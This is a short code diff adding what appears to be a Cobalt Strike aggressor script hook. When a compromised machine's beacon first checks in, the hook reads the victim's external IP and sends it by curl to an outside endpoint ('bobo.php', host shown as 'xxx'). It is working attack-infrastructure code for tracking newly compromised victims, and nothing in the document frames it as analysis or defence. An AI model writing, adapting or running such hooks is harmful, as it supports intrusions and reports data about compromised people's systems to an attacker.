@@ -1,0 +1,7 @@
+on beacon_initial {
+    local('$externalIP');
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $xssApi = "http://xxx/bobo.php?ip=".$externalIP;
+    @curl_command = @('curl', '-X', 'GET', $xssApi);
+    exec(@curl_command);
+}
